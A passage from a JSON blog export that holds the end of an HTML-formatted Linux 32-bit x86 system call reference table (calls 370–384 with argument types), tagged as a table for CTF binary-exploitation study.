style=\"color:#4f4f4f;\">370.</font> | <font style=\"color:#4f4f4f;\">sendmsg</font> | <font style=\"color:#4f4f4f;\">370.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">struct user_msghdr *msg</font> | <font style=\"color:#4f4f4f;\">unsigned flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">371.</font> | <font style=\"color:#4f4f4f;\">recvfrom</font> | <font style=\"color:#4f4f4f;\">371.</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">void *</font> | <font style=\"color:#4f4f4f;\">size_t</font> | <font style=\"color:#4f4f4f;\">unsigned</font> | <font style=\"color:#4f4f4f;\">struct sockaddr *</font> | <font style=\"color:#4f4f4f;\">int *</font> |\n| <font style=\"color:#4f4f4f;\">372.</font> | <font style=\"color:#4f4f4f;\">recvmsg</font> | <font style=\"color:#4f4f4f;\">372.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">struct user_msghdr *msg</font> | <font style=\"color:#4f4f4f;\">unsigned flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">373.</font> | <font style=\"color:#4f4f4f;\">shutdown</font> | <font style=\"color:#4f4f4f;\">373.</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">374.</font> | <font style=\"color:#4f4f4f;\">userfaultfd</font> | <font style=\"color:#4f4f4f;\">374.</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">375.</font> | <font style=\"color:#4f4f4f;\">membarrier</font> | <font style=\"color:#4f4f4f;\">375.</font> | <font style=\"color:#4f4f4f;\">int cmd</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">376.</font> | <font style=\"color:#4f4f4f;\">mlock2</font> | <font style=\"color:#4f4f4f;\">376.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">377.</font> | <font style=\"color:#4f4f4f;\">copy_file_range</font> | <font style=\"color:#4f4f4f;\">377.</font> | <font style=\"color:#4f4f4f;\">int fd_in</font> | <font style=\"color:#4f4f4f;\">loff_t *off_in</font> | <font style=\"color:#4f4f4f;\">int fd_out</font> | <font style=\"color:#4f4f4f;\">loff_t *off_out</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> |\n| <font style=\"color:#4f4f4f;\">378.</font> | <font style=\"color:#4f4f4f;\">preadv2</font> | <font style=\"color:#4f4f4f;\">378.</font> | <font style=\"color:#4f4f4f;\">unsigned long fd</font> | <font style=\"color:#4f4f4f;\">const struct iovec *vec</font> | <font style=\"color:#4f4f4f;\">unsigned long vlen</font> | <font style=\"color:#4f4f4f;\">unsigned long pos_l</font> | <font style=\"color:#4f4f4f;\">unsigned long pos_h</font> | <font style=\"color:#4f4f4f;\">rwf_t flags</font> |\n| <font style=\"color:#4f4f4f;\">379.</font> | <font style=\"color:#4f4f4f;\">pwritev2</font> | <font style=\"color:#4f4f4f;\">379.</font> | <font style=\"color:#4f4f4f;\">unsigned long fd</font> | <font style=\"color:#4f4f4f;\">const struct iovec *vec</font> | <font style=\"color:#4f4f4f;\">unsigned long vlen</font> | <font style=\"color:#4f4f4f;\">unsigned long pos_l</font> | <font style=\"color:#4f4f4f;\">unsigned long pos_h</font> | <font style=\"color:#4f4f4f;\">rwf_t flags</font> |\n| <font style=\"color:#4f4f4f;\">380.</font> | <font style=\"color:#4f4f4f;\">pkey_mprotect</font> | <font style=\"color:#4f4f4f;\">380.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">unsigned long prot</font> | <font style=\"color:#4f4f4f;\">int pkey</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">381.</font> | <font style=\"color:#4f4f4f;\">pkey_alloc</font> | <font style=\"color:#4f4f4f;\">381.</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> | <font style=\"color:#4f4f4f;\">unsigned long init_val</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">382.</font> | <font style=\"color:#4f4f4f;\">pkey_free</font> | <font style=\"color:#4f4f4f;\">382.</font> | <font style=\"color:#4f4f4f;\">int pkey</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">383.</font> | <font style=\"color:#4f4f4f;\">statx</font> | <font style=\"color:#4f4f4f;\">383.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *path</font> | <font style=\"color:#4f4f4f;\">unsigned flags</font> | <font style=\"color:#4f4f4f;\">unsigned mask</font> | <font style=\"color:#4f4f4f;\">struct statx *buffer</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">384.</font> | <font style=\"color:#4f4f4f;\">arch_prctl</font> | <font style=\"color:#4f4f4f;\">384.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n\n\n","tags":["PWN攻略-所需表格","计算机原理相关表格"],"categories":["PWN不出来"]}]